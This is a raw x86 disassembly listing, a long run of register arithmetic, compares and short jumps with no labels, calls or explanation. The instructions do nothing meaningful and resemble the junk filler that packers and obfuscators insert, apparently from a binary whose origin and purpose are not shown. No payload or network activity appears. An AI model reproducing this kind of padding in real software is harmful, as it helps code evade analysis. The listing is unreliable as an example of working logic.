  405da3:	mov    ecx,ebx
  405da5:	add    ecx,0x2
  405dab:	sub    esi,0x1
  405db1:	add    ebx,0x1
  405db7:	lea    ecx,ds:0x8
  405dbd:	add    esi,ecx
  405dbf:	sub    ebp,0x1
  405dc5:	lea    ecx,[edi+0xa]
  405dcb:	xchg   edx,esi
  405dcd:	mov    ebp,0xfd
  405dd2:	add    esi,0x1
  405dd8:	mov    edi,edx
  405dda:	sub    edx,0x2
  405de0:	or     ebx,DWORD PTR ds:0x446eb0
  405de6:	add    edi,ecx
  405de8:	sub    ecx,esi
  405dea:	inc    edi
  405deb:	setno  al
  405dee:	sub    edx,DWORD PTR ds:0x455c84
  405df4:	lea    ecx,ds:0x7e
  405dfa:	add    edx,esi
  405dfc:	add    edi,0x2
  405e02:	lea    edx,ds:0xf0
  405e08:	mov    ebp,0xb
  405e0d:	or     edx,0x7a
  405e10:	xchg   esi,ebp
  405e12:	add    ebx,0x1
  405e18:	cmp    ebx,DWORD PTR ds:0x461f36
  405e1e:	add    ecx,0x1
  405e24:	sub    esi,0x1
  405e2a:	lea    esi,ds:0xd
  405e30:	add    ebp,esi
  405e32:	add    edx,0x1
  405e38:	sub    esi,0x1
  405e3e:	lea    ecx,[edx+0xc6]
  405e44:	mov    eax,esi
  405e46:	add    ecx,edx
  405e48:	or     edi,0x6
  405e4b:	add    esi,0x2
  405e51:	mov    ecx,0xff
  405e56:	inc    ecx
  405e57:	sub    ecx,0x2
  405e5d:	lea    ebp,[esi+0x1]
  405e63:	or     ecx,0x50
  405e66:	add    ecx,0x1
  405e6c:	lea    ebp,[ecx+0x2]
  405e72:	test   edx,ebx
  405e74:	jne    0x405e7a
  405e76:	mov    ebp,esi
  405e78:	add    esi,edx
  405e7a:	mov    esi,0xaa
  405e7f:	cmp    bx,0xb9ce
  405e84:	jae    0x405e90
  405e86:	sub    esi,DWORD PTR ds:0x46570f
  405e8c:	add    ecx,esi
  405e8e:	inc    ebx
  405e8f:	dec    ebx
  405e90:	sub    ebx,0x2
  405e96:	xor    edx,DWORD PTR ds:0x441107
  405e9c:	mov    edx,0x45
  405ea1:	add    ebp,ecx
  405ea3:	add    ebp,edi
  405ea5:	sub    edi,0x2
  405eab:	add    edx,ebx
  405ead:	sub    ecx,ebx
  405eaf:	cmp    esi,0x5e6e8e18
  405eb5:	je     0x405ec2
  405eb7:	and    edx,0xe7
  405ebd:	sub    ebx,edi
  405ebf:	mov    ebx,ecx
  405ec1:	dec    ecx
  405ec2:	sub    edi,0x2
  405ec8:	mov    esi,0xee
  405ecd:	add    ecx,edi
  405ecf:	lea    ebx,[ecx+0x5]
  405ed5:	cmp    edx,0x7430cd9e
  405edb:	jbe    0x405ee2
  405edd:	xor    ebx,ebx
  405edf:	or     ebx,0x7b
  405ee2:	add    ebx,esi
  405ee4:	or     dl,ch
  405ee6:	add    esi,ebx
  405ee8:	sub    ebp,0x1
  405eee:	add    ebp,0x2
  405ef4:	and    esi,0xa4
  405efa:	mov    ebp,0x53
  405eff:	add    edx,esi
  405f01:	sub    edx,0x2
  405f07:	xor    ecx,DWORD PTR ds:0x44551a
  405f0d:	xor    esi,edi
  405f0f:	mov    eax,0x4f
  405f14:	lea    eax,ds:0x6
  405f1a:	sub    edi,DWORD PTR ds:0x4431e5
  405f20:	mov    ebx,0x36
  405f25:	add    edi,0x2
  405f2b:	sub    edi,0x1
  405f31:	lea    eax,ds:0xe9
  405f37:	or     ecx,DWORD PTR ds:0x451aac
  405f3d:	sub    ebx,0x1
  405f43:	lea    esi,[esi+0x8]
  405f49:	setne  cl
  405f4c:	cmp    ecx,DWORD PTR ds:0x441cb5
  405f52:	mov    ebx,0xb7
  405f57:	lea    edx,ds:0xa7
  405f5d:	lea    ecx,ds:0x7
  405f63:	or     edi,0x61
  405f66:	lea    esi,ds:0xc
  405f6c:	add    edi,0x1
  405f72:	add    edi,0x2
  405f78:	mov    eax,0x1d
  405f7d:	cmp    ebp,DWORD PTR ds:0x45cdc2
  405f83:	add    ebp,0x2
  405f89:	xor    edi,ebp
  405f8b:	mov    eax,esi
  405f8d:	mov    ecx,0x4d
  405f92:	lea    esi,[esi+0x63]
  405f98:	mov    esi,edi
  405f9a:	add    esi,ecx
  405f9c:	lea    edx,ds:0x0
  405fa2:	sub    edi,DWORD PTR ds:0x47afb5
  405fa8:	add    edi,ebx
  405faa:	add    ecx,0x1
  405fb0:	mov    eax,0x9a
  405fb5:	or     ecx,0x7d
  405fb8:	sub    ecx,0x2
  405fbe:	lea    edi,[ecx+0xf3]
  405fc4:	add    ecx,0x1
  405fca:	or     edi,DWORD PTR ds:0x463b42
  405fd0:	lea    edi,ds:0xb3
  405fd6:	add    esi,0x1
  405fdc:	add    edx,0x1
  405fe2:	mov    ebx,0x6c
  405fe7:	sub    esi,0x1
  405fed:	cmp    edi,0x56db41d0
  405ff3:	jne    0x405ffb
  405ff5:	mov    ecx,0xd9
  405ffa:	inc    edi
  405ffb:	mov    ecx,0x40
  406000:	add    ebp,edx
  406002:	lea    esi,ds:0x8d
  406008:	add    edi,esi
  40600a:	sub    edx,0x1
  406010:	add    ecx,0x1
  406016:	or     ecx,DWORD PTR ds:0x47171e
  40601c:	mov    ebx,edx
  40601e:	or     bp,sp
  406021:	sub    esi,0x2
  406027:	add    ecx,0x2
  40602d:	add    ecx,0x1
  406033:	xchg   ebp,edx
  406035:	lea    esi,ds:0x6
  40603b:	mov    ebx,0xc6
  406040:	lea    ebp,[edi+0xc]
  406046:	add    ebx,0x2
  40604c:	xor    edx,edx
  40604e:	sub    ecx,0x2
  406054:	sub    ebp,0x2
  40605a:	mov    edx,0x9d
  40605f:	sub    ebx,esi
  406061:	or     ebx,ecx
  406063:	sub    edi,0x1
  406069:	cmp    ebp,DWORD PTR ds:0x47d054
  40606f:	lea    edi,ds:0x2
  406075:	xor    esi,DWORD PTR ds:0x464cb5
  40607b:	sub    ecx,edx
  40607d:	or     ebx,0x65
  406080:	sub    edx,0x2
  406086:	cmp    bx,0xdd06
  40608b:	jns    0x40609a
  40608d:	add    edx,0x1
  406093:	add    edx,esi
  406095:	add    esi,edi
  406097:	add    ebx,edx
  406099:	inc    esi
  40609a:	mov    ebx,0xc0
  40609f:	add    esi,0x1
  4060a5:	setle  al
  4060a8:	cmp    ebx,0x4a07a037
  4060ae:	jns    0x4060b4
  4060b0:	mov    ebp,ebx
  4060b2:	and    esi,ebx
  4060b4:	cmp    bx,0x893f
  4060b9:	jns    0x4060c1
  4060bb:	lea    edx,ds:0x60
  4060c1:	mov    edi,edx
  4060c3:	or     ecx,DWORD PTR ds:0x47a7c7
  4060c9:	add    ecx,edi
  4060cb:	lea    esi,ds:0x9
  4060d1:	mov    edx,0x23
  4060d6:	lea    edx,ds:0x4
  4060dc:	mov    ebx,0x97
  4060e1:	sub    esi,edx
  4060e3:	sub    ecx,DWORD PTR ds:0x45b4fc
  4060e9:	cmp    esi,0x1b
  4060ec:	jp     0x4060fe
  4060ee:	sub    esi,0x1
  4060f4:	mov    esi,0xb5
  4060f9:	xor    edx,edx
  4060fb:	mov    ebx,edi
  4060fd:	dec    ecx
  4060fe:	mov    ebp,0x36
  406103:	mov    ebx,0x45
  406108:	or     cl,dh
  40610a:	lea    ebx,[edx+0xd3]
  406110:	add    ebp,0x1
  406116:	mov    esi,ecx
  406118:	add    edi,esi
  40611a:	lea    eax,ds:0xf6
  406120:	add    edx,ecx
  406122:	add    edx,0x1
  406128:	cmp    esi,DWORD PTR ds:0x4435d0
  40612e:	add    ebx,0x2
  406134:	lea    edi,[ecx+0x2]
  40613a:	sub    edi,edx
  40613c:	inc    ebp
  40613d:	add    edx,ecx
  40613f:	lea    ebx,ds:0x4
  406145:	lea    edx,[edx+0xa]
  40614b:	inc    ebp
  40614c:	cmp    edx,DWORD PTR ds:0x468796
  406152:	sub    ebp,edx
  406154:	add    edi,0x2
  40615a:	lea    ebp,ds:0xc6
  406160:	cmp    di,0x8f77
  406165:	ja     0x406169
  406167:	add    edi,edx
  406169:	mov    edi,0xee
  40616e:	sub    edx,ecx
  406170:	mov    edx,edi
  406172:	add    edx,0x2
  406178:	lea    edx,[edi+0x7e]
  40617e:	sub    edx,0x1
  406184:	lea    ebp,[edi+0xf5]
  40618a:	lea    ebp,[edi+0xa5]
  406190:	or     esi,0xc
  406193:	lea    edx,ds:0x9
  406199:	sub    edi,0x2
  40619f:	setns  cl
  4061a2:	add    esi,0x1
  4061a8:	sub    ebp,0x1
  4061ae:	mov    edx,esi
  4061b0:	lea    esi,ds:0x9
  4061b6:	lea    ecx,[edi+0xe0]
  4061bc:	sub    edx,esi
  4061be:	add    ebp,ebx
  4061c0:	add    edi,ebx
  4061c2:	lea    ebp,[ebx+0xe]
  4061c8:	mov    ebx,0x5d
  4061cd:	lea    edx,ds:0x9
  4061d3:	add    ebp,edi
  4061d5:	sub    edx,ecx
  4061d7:	lea    ebx,ds:0xe
  4061dd:	mov    esi,0x9
  4061e2:	add    edi,esi
  4061e4:	test   edx,esi
  4061e6:	jne    0x4061ea
  4061e8:	add    edx,edi
  4061ea:	xor    ebp,edi
  4061ec:	test   edx,ebx
  4061ee:	je     0x4061f3
  4061f0:	add    ecx,esi
  4061f2:	dec    edi
  4061f3:	add    edx,0x2
  4061f9:	add    esi,0x1
  4061ff:	mov    edx,0xef
  406204:	add    ebp,0x1
  40620a:	lea    ecx,[edi+0x7]
  406210:	lea    edx,ds:0x3
  406216:	cmp    edx,0x2216421e
  40621c:	jg     0x406224
  40621e:	mov    edx,0x4c
  406223:	dec    ecx
  406224:	sub    ebp,0x2
  40622a:	sub    ebx,ecx
  40622c:	test   ecx,edi
  40622e:	je     0x406233
  406230:	bswap  edi
  406232:	dec    edx
  406233:	mov    ebx,0x4b
  406238:	lea    ecx,ds:0x2e
  40623e:	lea    edx,ds:0x7
  406244:	lea    ecx,ds:0x6f
  40624a:	or     ecx,0xa
  40624d:	sub    edi,edx
  40624f:	lea    eax,[ecx+0x5]
  406255:	inc    edx
  406256:	lea    edx,ds:0xe
  40625c:	add    ebx,esi
  40625e:	xor    ebp,edi
  406260:	add    ebp,edx
  406262:	sub    esi,0x2
  406268:	setno  dl
  40626b:	cmp    ecx,0x8c5f2bda
  406271:	jge    0x406279
  406273:	lea    ecx,ds:0x3
  406279:	mov    edx,esi
  40627b:	mov    eax,0x7
  406280:	sub    esi,0x2
  406286:	lea    ebp,[esi+0xe7]
  40628c:	lea    esi,[ebx+0x4]
  406292:	lea    ebx,ds:0x52
  406298:	add    ebx,0x2
  40629e:	inc    esi
  40629f:	lea    ecx,[ecx+0x4b]
  4062a5:	sub    ecx,0x1
  4062ab:	mov    edx,0xb7
  4062b0:	sub    ebp,0x2
  4062b6:	sub    ebp,0x2
  4062bc:	cmp    esi,0xad424ec2
  4062c2:	jg     0x4062ce
  4062c4:	mov    esi,ebx
  4062c6:	setnp  bl
  4062c9:	and    ebx,edi
  4062cb:	mov    ebp,edi
  4062cd:	dec    ebp
  4062ce:	sub    esi,0x1
  4062d4:	add    esi,ebx
  4062d6:	add    ebp,ebx
  4062d8:	lea    ebx,[ebx+0xa]
  4062de:	lea    ebp,[ebx+0xf8]
  4062e4:	add    edx,0x1
  4062ea:	lea    edx,ds:0x9
  4062f0:	add    edi,0x1
  4062f6:	add    esi,0x1
  4062fc:	sub    edx,0x1
  406302:	sub    ecx,0x2
  406308:	sub    ebx,esi
  40630a:	lea    edx,ds:0xb
  406310:	mov    edx,esi
  406312:	lea    ecx,[edx+0xa5]
  406318:	add    esi,0x2
  40631e:	test   ebx,esi
  406320:	jne    0x406324
  406322:	mov    edx,esi
  406324:	add    edx,esi
  406326:	sub    esi,edi
  406328:	add    edi,ecx
  40632a:	sub    ecx,esi
  40632c:	lea    edx,ds:0xe8
  406332:	add    ebp,ebx
  406334:	add    ecx,edi
  406336:	mov    bp,0x589d
  40633a:	add    ecx,edi
  40633c:	cmp    edi,DWORD PTR ds:0x47541a
  406342:	add    esi,ecx
  406344:	xadd   ebp,edx
  406347:	lea    edx,[ecx+0xa4]
  40634d:	inc    ebx
  40634e:	add    esi,0x2
  406354:	lea    edi,ds:0x0
  40635a:	lea    edx,[ebx+0x43]
  406360:	sub    edx,0x1
  406366:	or     ebx,DWORD PTR ds:0x473de5
  40636c:	sub    ebx,0x2
  406372:	lea    edi,[edx+0x96]
  406378:	or     edi,DWORD PTR ds:0x4536dc
  40637e:	add    ecx,0x1
  406384:	lea    esi,[esi+0x5]
  40638a:	or     ecx,DWORD PTR ds:0x4727ef
  406390:	lea    ebp,[edi+0x6]
  406396:	lea    ecx,ds:0xb
  40639c:	lea    ebx,[ebx+0x35]
  4063a2:	dec    ebx
  4063a3:	lea    edi,ds:0x7
  4063a9:	mov    cx,0xedde
  4063ad:	mov    edx,0xb6
  4063b2:	mov    eax,0xe
  4063b7:	movzx  edx,ch
  4063ba:	sub    ebp,0x1
  4063c0:	or     ebx,DWORD PTR ds:0x47eba8
  4063c6:	neg    ebp
  4063c8:	sub    ecx,0x2
  4063ce:	sub    edi,0x1
  4063d4:	lea    eax,[edi+0xb]
  4063da:	sub    edi,ebx
  4063dc:	add    edx,0x1
  4063e2:	or     edx,0x16
  4063e5:	add    ebx,0x1
  4063eb:	sub    esi,0x1
  4063f1:	mov    edx,0xd6
  4063f6:	add    edi,ecx
  4063f8:	lea    ebp,[ebx+0xf]
  4063fe:	add    edx,0x1
  406404:	or     cx,dx
  406407:	sub    edi,0x2
  40640d:	lea    edx,[esi+0xf]
  406413:	sub    ebx,0x1
  406419:	add    ecx,edx
  40641b:	dec    edi
  40641c:	add    edi,0x1
  406422:	add    ebx,edi
  406424:	cmp    ebp,DWORD PTR ds:0x45b1f7
  40642a:	sub    ebp,0x2
  406430:	sub    ebx,0x1
  406436:	add    ecx,esi
  406438:	add    ebx,edi
  40643a:	inc    ecx
  40643b:	lea    edi,ds:0xef
  406441:	lea    edi,[esi+0x6]
  406447:	lea    esi,ds:0x22
  40644d:	mov    edi,0x57
  406452:	lea    ebp,[esi+0xbb]
  406458:	mov    eax,0x10
  40645d:	movzx  ebx,dl
  406460:	sub    edx,0x1
  406466:	bt     edi,edx
  406469:	sub    edi,0x1
  40646f:	sub    edx,0x2
  406475:	sub    esi,edx
  406477:	add    ebx,edi
  406479:	sub    ecx,0x2
  40647f:	mov    ecx,0xfc
  406484:	mov    edi,ebx
  406486:	sub    edi,0x2
  40648c:	sub    esi,DWORD PTR ds:0x4448b7
  406492:	mov    ebx,edx
  406494:	xor    ebx,esi
  406496:	lea    eax,ds:0x59
  40649c:	add    esi,ecx
  40649e:	mov    ecx,0x7
  4064a3:	add    ebp,0x2
  4064a9:	lea    ebx,[ecx+0x1]
  4064af:	sub    ebp,0x2
  4064b5:	add    edi,0x1
  4064bb:	lea    ebx,ds:0x3b
  4064c1:	add    edi,0x1
  4064c7:	add    esi,edi
  4064c9:	mov    edi,0xd5
  4064ce:	mov    ebx,edi
  4064d0:	sub    ebp,edi
  4064d2:	sub    edx,0x1
  4064d8:	sub    edi,ecx
  4064da:	inc    esi
  4064db:	add    esi,0x2
  4064e1:	add    ebp,edi
  4064e3:	lea    edi,ds:0x34
  4064e9:	sub    ecx,0x1
  4064ef:	mov    edx,ebx
  4064f1:	add    edi,0x1
  4064f7:	add    ebx,edx
  4064f9:	or     ecx,0x35
  4064fc:	sub    edi,0x1
  406502:	add    ebx,0x1
  406508:	add    ebx,esi
  40650a:	xor    esi,ecx
  40650c:	add    ebx,0x2
  406512:	add    edi,0x2
  406518:	lea    eax,ds:0x67
  40651e:	lea    edi,ds:0x41
  406524:	test   ebx,edi
  406526:	je     0x40652b
  406528:	xchg   esi,ebx
  40652a:	inc    esi
  40652b:	add    edi,esi
  40652d:	lea    ebx,ds:0xc
  406533:	add    esi,0x1
  406539:	sub    ebx,0x1
  40653f:	lea    esi,ds:0xe
  406545:	lea    ebp,[ecx+0x0]
  40654b:	lea    ebp,[edx+0x0]
  406551:	sub    esi,ebx
  406553:	add    edx,0x2
  406559:	or     ecx,0x22
  40655c:	cmp    ecx,0x16
  40655f:	jg     0x406571
  406561:	or     dx,cx
  406564:	add    ecx,esi
  406566:	sub    edi,DWORD PTR ds:0x451d94
  40656c:	and    edi,edx
  40656e:	add    edx,edi
  406570:	inc    ebx
  406571:	sub    ebx,0x1
  406577:	mov    edi,0xf2
  40657c:	add    ebp,0x2
  406582:	or     si,bx
  406585:	sub    ecx,0x1
  40658b:	add    edi,edx
  40658d:	mov    edi,0x14
  406592:	sub    ebp,0x2
  406598:	cmp    edi,DWORD PTR ds:0x46c53a
  40659e:	mov    edx,0x89
  4065a3:	lea    esi,ds:0x7a
  4065a9:	cmp    ebx,0x19a53aac
  4065af:	jp     0x4065bd
  4065b1:	mov    ebx,0x23
  4065b6:	dec    ebx
  4065b7:	sub    esi,0x2
  4065bd:	mov    ecx,edx
  4065bf:	mov    edx,0x49
  4065c4:	sub    ebx,0x1
  4065ca:	lea    ebx,ds:0xe
  4065d0:	sub    ebx,edx
  4065d2:	add    esi,edx
  4065d4:	mov    eax,ebx
  4065d6:	or     ebp,0xa
  4065d9:	or     bx,bx
  4065dc:	lea    ebx,ds:0x78
  4065e2:	mov    ebx,0x5d
  4065e7:	or     esi,0xe
  4065ea:	lea    eax,ds:0xae
  4065f0:	neg    ebp
  4065f2:	sub    ebx,0x1
  4065f8:	cmp    si,0x12af
  4065fd:	jns    0x406606
  4065ff:	xor    esi,DWORD PTR ds:0x46a6ea
  406605:	dec    esi
  406606:	add    ebp,0x1
  40660c:	add    ebx,0x1
  406612:	cmp    di,0xbec
  406617:	jbe    0x406621
  406619:	add    ecx,0x1
  40661f:	add    ecx,edx
  406621:	or     ebx,0x4e
  406624:	sub    ebp,0x1
  40662a:	mov    edi,0x7
  40662f:	mov    eax,edx
  406631:	add    esi,0x1
  406637:	or     si,bx
  40663a:	add    ebp,0x2
  406640:	sub    ebp,0x1
  406646:	test   esi,ebx
  406648:	jne    0x40664e
  40664a:	sub    esi,edi
  40664c:	add    ecx,edi
  40664e:	sub    esi,0x1
  406654:	add    ebx,0x1
  40665a:	sub    ebx,edi
  40665c:	or     ebx,DWORD PTR ds:0x44bc12
  406662:	lea    esi,[ebx+0x8]
  406668:	add    edi,ebx
  40666a:	lea    ebx,[ecx+0x2]
  406670:	mov    si,0xeb5e
  406674:	sub    ebp,DWORD PTR ds:0x46a424
  40667a:	sub    ebx,ecx
  40667c:	sub    ecx,0x1
  406682:	add    ebp,0x2
  406688:	add    ebx,esi
  40668a:	or     ebx,0x24
  40668d:	lea    ebx,[ebx+0x59]
  406693:	mov    eax,edi
  406695:	lea    esi,[esi+0xb]
  40669b:	lea    edx,ds:0x4
  4066a1:	add    edi,0x1
  4066a7:	or     dl,ch
  4066a9:	lea    ebp,ds:0xe2
  4066af:	sub    ebp,0x1
  4066b5:	cmp    edi,0xbf700b62
  4066bb:	jl     0x4066c2
  4066bd:	mov    edi,edx
  4066bf:	add    ecx,esi
  4066c1:	dec    ecx
  4066c2:	lea    edi,ds:0x9
  4066c8:	sub    ecx,0x2
  4066ce:	sub    esi,edx
  4066d0:	mov    ebx,edx
  4066d2:	xor    esi,DWORD PTR ds:0x462262
  4066d8:	add    esi,0x1
  4066de:	sub    ebp,0x2
  4066e4:	sub    ebp,0x2
  4066ea:	add    edx,esi
  4066ec:	mov    edi,esi
  4066ee:	inc    edx
  4066ef:	sub    edx,edi
  4066f1:	sbb    ecx,edi
  4066f3:	sub    ecx,0x1
  4066f9:	add    edi,edx
  4066fb:	or     ebx,0x10
  4066fe:	sub    edi,0x1
  406704:	mov    edi,0x4e
  406709:	sub    esi,ecx
  40670b:	lea    ebx,[esi+0x0]
  406711:	or     esi,0x4f
  406714:	sub    edi,esi
  406716:	add    esi,0x1
  40671c:	cmp    edx,0xfe4c2dd8
  406722:	jns    0x40672f
  406724:	lea    ebp,ds:0x3
  40672a:	add    esi,edi
  40672c:	xchg   esi,edi
  40672e:	inc    edi
  40672f:	inc    edx
  406730:	xor    edx,esi
  406732:	xor    edi,DWORD PTR ds:0x43cd8e
  406738:	xor    ebx,DWORD PTR ds:0x450082
  40673e:	cmp    edx,0x69
  406741:	jae    0x40674f
  406743:	mov    ecx,0x3b
  406748:	add    edx,0x1
  40674e:	inc    edi
  40674f:	mov    eax,esi
  406751:	add    esi,edi
  406753:	lea    edi,[esi+0x1b]
  406759:	xor    esi,DWORD PTR ds:0x47c6b7
  40675f:	mov    ebx,0x83
  406764:	cmp    edi,DWORD PTR ds:0x46b568
  40676a:	lea    eax,[esi+0xf]
  406770:	add    ebp,0x2
  406776:	lea    ebp,[ecx+0xb]
  40677c:	lea    eax,ds:0x0
  406782:	lea    eax,ds:0x4
  406788:	mov    eax,0x37
  40678d:	lea    edx,ds:0x4
  406793:	mov    eax,edx
  406795:	add    edi,0x2
  40679b:	lea    eax,ds:0x25
  4067a1:	mov    edx,0xfb
  4067a6:	sbb    esi,esi
  4067a8:	sub    esi,0x2
  4067ae:	lea    edx,ds:0x5
  4067b4:	sub    ebx,0x2
  4067ba:	mov    esi,0x25
  4067bf:	mov    ebp,0x74
  4067c4:	mov    ecx,edi
  4067c6:	add    ecx,esi
  4067c8:	lea    edi,ds:0x9a
  4067ce:	add    edx,ebx
  4067d0:	sub    edi,ecx
  4067d2:	mov    ecx,ebx
  4067d4:	add    esi,0x2
  4067da:	xor    ebx,ebp
  4067dc:	dec    ecx
